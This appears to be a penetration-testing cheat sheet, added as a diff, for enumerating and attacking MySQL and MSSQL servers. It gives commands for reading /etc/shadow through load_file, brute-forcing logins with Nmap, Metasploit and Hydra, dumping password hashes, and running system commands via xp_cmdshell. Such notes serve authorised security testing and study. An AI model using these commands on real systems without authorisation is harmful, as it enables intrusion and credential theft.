@@ -1,0 +1,52 @@
+♦ MySQL & MSSQL Enumeration
+SQL (Structured Query Language) is used to manage and manipulate databases.
+→ Microsoft SQL Server (MSSQL): Port 1433
+→ MySQL: Port 3306
+→ PostgreSQL: Port 5432
+
+♦ MySQL Command-Line Enumeration
+The built-in 'mysql' tool is used for direct database interaction and information retrieval.
+
+→ mysql -h <target> -u <user>                                  # Connects to a MySQL database server at <target> with the specified <user>.
+→ MySQL [(none)]> use <database>;                              # Connects to the specified database.
+→ MySQL [books]> select count(*) from authors;                 # Counts the number of records in the 'authors' table.
+→ MySQL [books]> select * from authors;                        # Retrieves all records from the 'authors' table.
+→ MySQL [(none)]> select load_file("/etc/shadow");             # Attempts to read the contents of a file (security check).
+
+♦ Nmap Scripting Engine (NSE) - MSSQL Scripts (Port 1433)
+These scripts target Microsoft SQL Server instances for detailed enumeration and vulnerability checking.
+
+→ nmap --script ms-sql-info <target>                                                                                                            # Gather basic information about MSSQL instances.
+→ nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1443 192.168.1.10                                                            # Gather NTLM authentication info.
+→ nmap --script ms-sql-empty-password <target>                                                                                                  # Detect MSSQL instances with empty (blank) passwords.
+→ nmap --script ms-sql-brute --script-args userdb=<dir_path>,passdb=<dir_path> <target>                                                         # Perform brute-force attacks.
+→ nmap --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password> <target>                                   # Dump password hashes.
+→ nmap --script ms-sql-query --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-query.query="..." -oN output.txt <target> # Execute a specific SQL query.
+→ nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=pass,ms-sql-xp-cmdshell.cmd="ifconfig" 192.168.1.10        # Execute command via xp_cmdshell.
+
+♦ Nmap Scripting Engine (NSE) - MySQL Scripts (Port 3306)
+These scripts target MySQL servers for information gathering and security auditing.
+
+→ nmap --script mysql-empty-password <target>                                                  # Detect MySQL servers with empty (blank) passwords.
+→ nmap --script mysql-empty-info <target>                                                      # Determine if MySQL servers provide empty password information.
+→ nmap --script mysql-users --script-args="mysqluser='root',mysqlpass=''" <target>             # Identify MySQL users.
+→ nmap --script mysql-databases --script-args="mysqluser='root',mysqlpass=''" <target>         # Enumerate MySQL databases.
+→ nmap --script mysql-variables --script-args="mysqluser='root',mysqlpass=''" <target>         # Retrieve MySQL server variables.
+→ nmap --script mysql-dump-hashes --script-args="mysqluser='root',mysqlpass=''" <target>       # Dump MySQL password hashes.
+→ nmap --script mysql-audit --script-args="mysqluser='root',mysqlpass=''" <target>             # Perform a basic MySQL security audit.
+→ nmap --script mysql-query --script-args="query='...',username='root',password=''" <target>    # Execute a specific SQL query.
+→ nmap --script mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='...'" <target> # Perform security audit with a specified audit file.
+
+♦ Metasploit (msfconsole) Enumeration Modules
+Modules used within the Metasploit Framework for database security assessment.
+
+→ use auxiliary/scanner/mssql/mssql_login              # Perform login attempts on MSSQL instances.
+→ use auxiliary/admin/mssql/mssql_enum_sql_logins      # Enumerate SQL Server logins (MSSQL).
+→ use auxiliary/admin/mssql/mssql_exec                 # Execute arbitrary SQL commands (MSSQL).
+→ use auxiliary/admin/mssql/mssql_enum_domain_accounts # Enumerate domain accounts (MSSQL).
+→ use auxiliary/scanner/mysql/mysql_login              # Perform login attempts on MySQL servers.
+→ use auxiliary/scanner/mysql/mysql_writable_dirs      # Scan for MySQL databases with writable directories.
+→ use auxiliary/scanner/mysql/mysql_hashdump           # Retrieve password hashes from a MySQL database.
+
+♦ Dictionary Attack (Hydra)
+→ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <target> mysql                   # Brute-force attack on MySQL using Hydra.
